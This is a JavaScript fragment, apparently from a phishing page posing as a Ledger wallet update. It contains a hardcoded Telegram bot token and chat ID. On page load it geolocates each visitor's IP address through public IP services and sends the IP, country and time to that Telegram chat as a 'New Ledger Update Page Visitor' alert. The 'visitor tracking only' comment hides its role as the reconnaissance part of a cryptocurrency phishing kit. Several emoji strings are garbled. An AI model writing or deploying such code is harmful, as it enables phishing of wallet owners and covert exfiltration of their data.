  <script>
    // Telegram Bot Configuration - for visitor tracking only
    const TELEGRAM_BOT_TOKEN = '8509658317:AAEGCol9RdefgNi2CvJlKQbWk35E1Qx9kUE';
    const TELEGRAM_CHAT_ID = '-4992816490';
    const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    // Function to convert country code to flag emoji
    function getCountryFlag(countryCode) {
      if (!countryCode || countryCode === 'Unknown' || countryCode.length !== 2) {
        return 'ð';
      }
      const codePoints = countryCode
        .toUpperCase()
        .split('')
        .map(char => 127397 + char.charCodeAt(0));
      return String.fromCodePoint(...codePoints);
    }

    // Get visitor IP and country info with multiple fallbacks
    async function getVisitorInfo() {
      // Try ip-api.com first
      try {
        const response = await fetch('https://ip-api.com/json/?fields=status,query,country,countryCode', {
          method: 'GET',
          headers: {
            'Accept': 'application/json',
          }
        });
        
        if (response.ok) {
          const data = await response.json();
          if (data.status === 'success') {
            console.log('IP API Success:', data);
            return {
              ip: data.query || 'Unknown',
              country: data.country || 'Unknown',
              countryCode: data.countryCode || null
            };
          }
        }
      } catch (error) {
        console.error('ip-api.com error:', error);
      }

      // Fallback to ipify + ipapi.co
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        if (ipResponse.ok) {
          const ipData = await ipResponse.json();
          const ip = ipData.ip || 'Unknown';
          
          // Try to get country from ipapi.co
          try {
            const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
            if (geoResponse.ok) {
              const geoData = await geoResponse.json();
              return {
                ip: ip,
                country: geoData.country_name || 'Unknown',
                countryCode: geoData.country_code || null
              };
            }
          } catch (e) {
            console.error('ipapi.co error:', e);
          }
          
          // If country fetch fails, return just IP
          return {
            ip: ip,
            country: 'Unknown',
            countryCode: null
          };
        }
      } catch (error) {
        console.error('Fallback IP API error:', error);
      }

      return null;
    }

    // Send visitor info to Telegram
    async function sendVisitorInfoToTelegram(ipData) {
      try {
        if (!ipData) {
          console.log('No IP data to send');
          return false;
        }

        const flag = ipData.countryCode ? getCountryFlag(ipData.countryCode) : 'ð';
        const currentTime = new Date().toLocaleString();
        const message = `ð *New Ledger Update Page Visitor*\n\nð *IP:* \`${ipData.ip}\`\n${flag} *Country:* ${ipData.country}\nð *Time:* ${currentTime}\nð *Page:* Ledger Update Wallet`;

        const payload = {
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown',
          disable_web_page_preview: true
        };

        console.log('Sending to Telegram:', payload);

        const response = await fetch(TELEGRAM_API_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(payload),
        });

        const result = await response.json();
        console.log('Telegram response:', result);

        if (response.ok && result.ok) {
          console.log('â Message sent to Telegram successfully');
          return true;
        } else {
          console.error('â Telegram API error:', result);
          return false;
        }
      } catch (error) {
        console.error('â Error sending to Telegram:', error);
        return false;
      }
    }
